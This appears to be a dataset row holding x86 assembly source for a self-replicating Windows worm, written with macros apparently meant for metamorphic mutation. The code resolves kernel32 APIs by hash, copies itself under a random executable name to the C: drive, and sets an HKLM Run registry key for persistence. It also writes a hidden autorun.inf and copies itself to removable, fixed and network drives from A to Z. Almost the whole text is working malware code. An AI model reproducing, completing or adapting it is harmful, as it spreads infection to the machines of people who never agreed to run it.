id,title,username,language,date,content
	cc rABS,    add,     ebx, eax			     ; relative -> absolut
	cc rAS,     mov,     dword[hNamePointerTable], ebx
	cc rAS,     add,     esi, 0x4

	cc rABS,    mov,     ebx, dword[esi]
	cc rABS,    add,     ebx, eax			     ; relative -> absolut
	cc rAS,     mov,     dword[hOrdinalTable], ebx

	cc rS,	    mov,     esi, dword[hNamePointerTable]
	cc rSI,     mov,     edi, dword[APICurrentAddress]
	cc rDSI,    mov,     edx, dword[APICurrentMagicNum]

	cc rDSI,     sub,     esi, 4
	cc rDPSI,    xor,     ebp, ebp
	cc rDPSI,    dec,     ebp

	cc rCDPSI,   xor,     ecx, ecx

	FindAPIsInLibraryGetNextAPI:
	cc rNoEmul,  pushad
		FindAPIsInLibraryNext:
			cc rDPSI,   inc,     ebp
			cc rDPSI,   add,     esi, 4
			cc rBDPSI,  mov,     ebx, dword[esi]
			cc rBDPSI,  add,     ebx, dword[hDLLkernel32]

			cc rNoEmul, call,    FindAPIGiveMeTheHash

			cc rADPSIF, cmp,     eax, dword[edx]
		cc rNoEmul, jne,     FindAPIsInLibraryNext


		cc rPSI,     mov,     esi, ebp	  ; coutner
		cc rPSI,     shl,     esi, 0x1	  ; esi*=2
	
		cc rPSI,     add,     esi, dword[hOrdinalTable]   ; esi=Pointer to ordinal table
		cc rBPSI,    xor,     ebx, ebx			  ; ebx=0
		cc rBPSI,    mov,     ebx, dword[esi]		  ; bx=Ordinal
		cc rBPSI,    and,     ebx, 0xFFFF

		cc rBPSI,    shl,     ebx, 0x2			  ; ebx=Ordinal*4
		cc rBPSI,    add,     ebx, dword[hAddressTable]   ; ebx=Pointer to Address of API
		cc rBPSI,    mov,     ebx, dword[ebx]
		cc rBPSI,    add,     ebx, dword[hDLLkernel32]	  ; relative -> absolut
		cc rPSI,     mov,     dword[edi], ebx
	cc rNoEmul,  popad
	cc rCDPSI,   inc,     ecx
	cc rCDPSI,   add,     edi, 4
	cc rCDPSI,   add,     edx, 4
	cc rCDPSIF,  cmp,     ecx, dword[APICurrentNumber]
	cc rNoEmul,  jb,      FindAPIsInLibraryGetNextAPI
cc rNoEmul, ret


FindAPIGiveMeTheHash:
; In: ebx=pointer to API name
; Out: eax=Hash   (in ax)
; changed: eax
;        mov,     ebx, apistr

	cc rBCDPSI, push,    ebx
	cc rBDPSI,  push,    ecx
	cc rBPSI,   push,    edx
	cc rABPSI,  xor,     eax, eax
	cc rABCPSI, xor,     ecx, ecx
	cc rABCPSI, dec,     ebx
	FindAPIGiveMeTheHashMore:
		cc rABCPSI,   xor,     eax, ecx
		cc rABCPSI,   inc,     ebx
		cc rABCPSI,   mov,     ecx, dword[ebx]
		cc rABCDPSI,  mov,     edx, ecx        ; ecx=nooo - n ... new byte
		cc rABCDPSI,  shr,     edx, 24	       ; edx=000n ... new byte
		cc rABCDPSIF, cmp,     dl, 0	       ; dl=n
	cc rNoEmul, jne,     FindAPIGiveMeTheHashMore

	cc rABPSI,   sub,     al, byte[ebx+0]
	cc rABPSI,   add,     ah, byte[ebx+1]
	cc rABPSI,   xor,     al, byte[ebx+2]

	cc rAPSI,    and,     eax, 0xFFFF
	cc rADPSI,   pop,     edx
	cc rACDPSI,  pop,     ecx
	cc rABCDPSI, pop,     ebx
cc rNoEmul, ret

; #####
; #####   Find addresses of APIs
; #####
; ###########################################################################
; ###########################################################################

; ###########################################################################
; ###########################################################################
; #####
; #####   Spreading part
; #####

CopyFileAndRegEntry:
	cc rS,	     xor,     esi, esi
	CopyFileAndRegEntryMore:
		cc rBS,      mov,     ebx, 26
		cc rBCS,     mov,     ecx, 97
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rS,	     mov,     byte[RandomFileName+esi], dl
		cc rS,	     inc,     esi
		cc rSF,      cmp,     esi, 8
	cc rNoEmul,  jb,     CopyFileAndRegEntryMore

	cc rA,	     mov,     eax, "".exe""
	cc rNoRes,   mov,     dword[RandomFileName+esi], eax

	cc rA,	     mov,     al, ""C""
	cc rNoRes,   mov,     byte[SpaceForHDC+1], al
	cc rA,	     mov,     al, "":""
	cc rNoRes,   mov,     byte[SpaceForHDC+2], al
	cc rA,	     mov,     al, ""\""
	cc rNoRes,   mov,     byte[SpaceForHDC+3], al

	cc rNoRes,   push,    FALSE
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoRes,   push,    dword[hMyFileName]
	cc rNoEmul,  stdcall, dword[_CopyFileA]

;  Encrypted representation of ""SOFTWARE\Microsoft\Windows\CurrentVersion\Run""
;  Will be a very good surface for this morphism

	cc rA,	     mov,     eax, stKey
	cc rAB,      mov,     ebx, ""SOFT""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""WARE""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""\Mic""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""roso""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""ft\W""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""indo""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""ws\C""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""urre""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""ntVe""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""rsio""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, ""n\Ru""
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     bl, ""n""
	cc rA,	     mov,     byte[eax], bl

	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    hKey
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    KEY_ALL_ACCESS
	cc rNoRes,   push,    REG_OPTION_NON_VOLATILE
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    stKey
	cc rNoRes,   push,    HKEY_LOCAL_MACHINE
	cc rNoEmul,  stdcall, dword[_RegCreateKeyExA]

	cc rNoRes,   push,    16
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoRes,   push,    REG_SZ
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[hKey]
	cc rNoEmul,  stdcall, dword[_RegSetValueExA]

	cc rNoRes,   push,    dword[hKey]
	cc rNoEmul,  stdcall, dword[_RegCloseKey]

	cc rNoEmul,  call,    OpenRandomFileRead

	cc rA,	     xor,     eax, eax
	cc rA,	     add,     eax, ""X:\a""
	cc rNoRes,   mov,     dword[stAutorunWithDrive], eax
	cc rA,	     mov,     eax, ""\aut""
	cc rNoRes,   mov,     dword[stAutorunWithDrive+2], eax
	cc rA,	     mov,     eax, ""orun""
	cc rNoRes,   mov,     dword[stAutoruninf+3], eax
	cc rA,	     mov,     eax, "".inf""
	cc rNoRes,   mov,     dword[stAutoruninf+7], eax

	cc rA,	     mov,     eax, ""[Aut""
	cc rNoRes,   mov,     dword[stAutoRunContent], eax
	cc rA,	     mov,     eax, ""orun""
	cc rNoRes,   mov,     dword[stAutoRunContent+0x04], eax
	cc rA,	     mov,     eax, 0x530A0D5D
	cc rNoRes,   mov,     dword[stAutoRunContent+0x08], eax
	cc rA,	     mov,     eax, ""hell""			 ; !!!!!!!
	cc rNoRes,   mov,     dword[stAutoRunContent+0x0C], eax
	cc rA,	     mov,     eax, ""Exec""
	cc rNoRes,   mov,     dword[stAutoRunContent+0x10], eax
	cc rA,	     mov,     eax, ""ute=""
	cc rNoRes,   mov,     dword[stAutoRunContent+0x14], eax
	cc rA,	     mov,     eax, dword[RandomFileName]	; Filename: XXXXxxxx.exe
	cc rNoRes,   mov,     dword[stAutoRunContent+0x18], eax
	cc rA,	     mov,     eax, dword[RandomFileName+0x4]	; Filename: xxxxXXXX.exe
	cc rNoRes,   mov,     dword[stAutoRunContent+0x1C], eax
	cc rA,	     mov,     eax, "".exe""
	cc rNoRes,   mov,     dword[stAutoRunContent+0x20], eax
	cc rA,	     mov,     eax, 0x73550A0D
	cc rNoRes,   mov,     dword[stAutoRunContent+0x24], eax
	cc rA,	     mov,     eax, ""eAut""
	cc rNoRes,   mov,     dword[stAutoRunContent+0x28], eax
	cc rA,	     mov,     eax, ""opla""
	cc rNoRes,   mov,     dword[stAutoRunContent+0x2C], eax
	cc rA,	     mov,     eax, 0x00313D79
	cc rNoRes,   mov,     dword[stAutoRunContent+0x30], eax



	; i like that coding style, roy g biv! :))
	cc rNoRes,   push,    51
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_MAP_ALL_ACCESS
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    51
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    PAGE_READWRITE
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_ATTRIBUTE_HIDDEN
	cc rNoRes,   push,    OPEN_ALWAYS
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    (GENERIC_READ or GENERIC_WRITE)
	cc rNoRes,   push,    stAutoruninf

	cc rNoEmul,  stdcall, dword[_CreateFileA]
	cc rA,	     push,    eax
	cc rNoRes,   mov,     dword[hCreateFileAR], eax
	cc rNoEmul,  stdcall, dword[_CreateFileMappingA]
	cc rA,	     push,    eax
	cc rNoRes,   mov,     dword[hCreateFileMappingAR], eax
	cc rNoEmul,  stdcall, dword[_MapViewOfFile]

	cc rAC,      xor,     cl, cl
	cc rACS,     mov,     esi, stAutoRunContent
	MakeAutoRunInfoMore:
		cc rABCS,    mov,     bl, byte[esi]
		cc rACS,     mov,     byte[eax], bl
		cc rACS,     inc,     eax
		cc rACS,     inc,     esi
		cc rACS,     inc,     ecx
		cc rACSF,    cmp,     cl, 51
	cc rNoEmul,  jb,      MakeAutoRunInfoMore

	cc rA,	    sub,     eax, 51
	cc rA,	    push,    dword[hCreateFileAR]
	cc rA,	    push,    dword[hCreateFileMappingAR]
	cc rA,	    push,    eax
	cc rNoEmul, stdcall, dword[_UnmapViewOfFile]
	cc rNoEmul, stdcall, dword[_CloseHandle]
	cc rNoEmul, stdcall, dword[_CloseHandle]

	cc rA,	    mov,     eax, ""A:\.""
	cc rNoEmul, mov,     dword[SpaceForHDC2+1], eax
	cc rA,	    mov,     eax, dword[RandomFileName]
	cc rNoEmul, mov,     dword[RandomFileName2], eax	 ; XXXXxxxx.exe
	cc rA,	    mov,     eax, dword[RandomFileName+0x04]
	cc rNoEmul, mov,     dword[RandomFileName2+0x04], eax	 ; xxxxXXXX.exe
	cc rA,	    mov,     eax, dword[RandomFileName+0x08]
	cc rNoEmul, mov,     dword[RandomFileName2+0x08], eax	 ; .exe
cc rNoEmul, ret


SpreadThisKitty:
	cc rNoEmul,  call,    CloseRandomFile

	cc rA,	     mov,     eax, 0x003A4100	     ; 0x0, ""A:"", 0x0
	cc rNoRes,   mov,     dword[SpaceForHDC2], eax

    STKAnotherRound:
	cc rNoRes,   push,    SpaceForHDC2+1
	cc rNoEmul,  stdcall, dword[_GetDriveTypeA]

	cc rAC,      mov,     cl, '\'
	cc rA,	     mov,     byte[SpaceForHDC2+3],cl

	cc rAF,      cmp,     al, 0x2
	cc rNoEmul,  je,      STKWithAutoRun

	cc rAF,      cmp,     al, 0x3
	cc rNoEmul,  je,      STKWithoutAutoRun

	cc rAF,      cmp,     al, 0x4
	cc rNoEmul,  je,      STKWithAutoRun

	cc rAF,      cmp,     al, 0x6
	cc rNoEmul,  je,      STKWithAutoRun

	cc rNoEmul,  jmp,     STKCreateEntriesForNextDrive

	STKWithAutoRun:

	cc rNoRes,   push,    FALSE
	cc rNoRes,   push,    stAutorunWithDrive
	cc rNoRes,   push,    stAutoruninf
	cc rNoEmul,  stdcall, dword[_CopyFileA]

	STKWithoutAutoRun:

	cc rNoRes,   push,    FALSE
	cc rNoRes,   push,    SpaceForHDC2+1
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoEmul,  stdcall, dword[_CopyFileA]


	STKCreateEntriesForNextDrive:
	cc rA,	     xor,     eax, eax
	cc rA,	     mov,     al, byte[SpaceForHDC2+1]
	cc rAF,      cmp,     al, ""Z""
	cc rNoEmul,  je,      SpreadThisKittyEnd

	cc rA,	     inc,     al
	cc rA,	     mov,     byte[SpaceForHDC2+1], al	      ; next drive
	cc rA,	     mov,     byte[stAutorunWithDrive], al    ; next drive
	cc rA,	     mov,     byte[SpaceForHDC2+3], ah	      ; 0x0, ""X:"", 0x0
    cc rNoEmul,  jmp, STKAnotherRound

    SpreadThisKittyEnd:
	cc rNoEmul,  call,    OpenRandomFileRead
cc rNoEmul,  ret


OpenRandomFileRead:
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_ATTRIBUTE_NORMAL
	cc rNoRes,   push,    OPEN_ALWAYS
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    GENERIC_READ
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoEmul,  stdcall, dword[_CreateFileA]
	cc rNoRes,   mov,     dword[hCreateFileRndFile], eax

	cc rNoRes,   push,    dFileSize
	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_GetFileSize]
	cc rNoRes,   mov,     dword[dFileSize], eax

	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[dFileSize]
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    PAGE_READONLY
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_CreateFileMappingA]
	cc rNoRes,   mov,     dword[hCreateMapRndFile], eax

	cc rNoRes,   push,    dword[dFileSize]
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_MAP_READ
	cc rNoRes,   push,    dword[hCreateMapRndFile]
	cc rNoEmul,  stdcall, dword[_MapViewOfFile]
	cc rNoRes,   mov,     dword[hMapViewRndFile], eax
	cc rNoRes,   cmp,     eax, 0x0
	cc rNoEmul,  jne,     OpenRandomFileReadNoProblem   ; Potential problems while page file
							    ; will be increased
	cc rNoEmul,  call,    CloseRandomFile
	cc rNoRes,   push,    5000
	cc rNoEmul,  stdcall, dword[_Sleep]		    ; wait 5sec and try it again
	cc rNoEmul,  jmp,     OpenRandomFileRead

	OpenRandomFileReadNoProblem:
	cc rA,	     add,     eax, CodeStartInFile
	cc rNoRes,   mov,     dword[WormCodeStart], eax
cc rNoEmul,  ret



OpenRandomFileWrite:
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_ATTRIBUTE_NORMAL
	cc rNoRes,   push,    OPEN_ALWAYS
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    GENERIC_READ or GENERIC_WRITE
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoEmul,  stdcall, dword[_CreateFileA]
	cc rNoRes,   mov,     dword[hCreateFileRndFile], eax

	cc rNoRes,   push,    dFileSize
	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_GetFileSize]
	cc rNoRes,   mov,     dword[dFileSize], eax

	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[dFileSize]
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    PAGE_READWRITE
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_CreateFileMappingA]
	cc rNoRes,   mov,     dword[hCreateMapRndFile], eax

	cc rNoRes,   push,    dword[dFileSize]
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_MAP_WRITE
	cc rNoRes,   push,    dword[hCreateMapRndFile]
	cc rNoEmul,  stdcall, dword[_MapViewOfFile]
	cc rA,	     mov,     dword[hMapViewRndFile], eax
	cc rNoRes,   cmp,     eax, 0x0
	cc rNoEmul,  jne,     OpenRandomFileWriteNoProblem  ; Potential problems while page file
							    ; will be increased
	cc rNoEmul,  call,    CloseRandomFile
	cc rNoRes,   push,    5000
	cc rNoEmul,  stdcall, dword[_Sleep]		    ; wait 5sec and try it again
	cc rNoEmul,  jmp,     OpenRandomFileWrite

	OpenRandomFileWriteNoProblem:
	cc rA,	     add,     eax, CodeStartInFile
	cc rNoRes,   mov,     dword[WormCodeStart], eax
cc rNoEmul,  ret

CloseRandomFile:
	cc rNoRes,   push,    dword[hMapViewRndFile]
	cc rNoEmul,  stdcall, dword[_UnmapViewOfFile]

	cc rNoRes,   push,    dword[hCreateMapRndFile]
	cc rNoEmul,  stdcall, dword[_CloseHandle]

	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_CloseHandle]
cc rNoEmul,  ret
EndPaddedCommands:
; #####
; #####   Spreading part
; #####
; ###########################################################################
; ###########################################################################


		hAnalyseBehaviourOfCode   dd AnalyseBehaviourOfCode  ; This value must be
						  ; in a protected environment
						  ; because the program has the
						  ; will to self-destruct itself
						  ; as soon as it has some freedom!!!

; ###########################################################################
; ###########################################################################
; #####
; #####   Global BehaviourTable
; #####

; Each Command has a 8bit value in the GBT
; GBT_Entry = X g f e d c b a


; a=1: EAX must have the same value
; b=1: EBX must have the same value
; c=1: ECX must have the same value
; d=1: EDX must have the same value
; e=1: EBP must have the same value
; f=1: ESI must have the same value
; g=1: EDI must have the same value
; X=1: Flags must have the same value
; ESP value must always be the same, therefore there is one bit left for Flags :))

; Special feature: If GBT_Entry=10110101 -> no execution (jumps, rets, call, ...)


GlobalBehaviourTable:
;                Command1 db 10000011b
;                Command2 db 00000011b
		 db GlobalBehaviourTableList

; #####
; #####   Global BehaviourTable
; #####
; ###########################################################################
; ###########################################################################


.end CodeStart

; ""Dr."" stands for ""drunken"" :)"
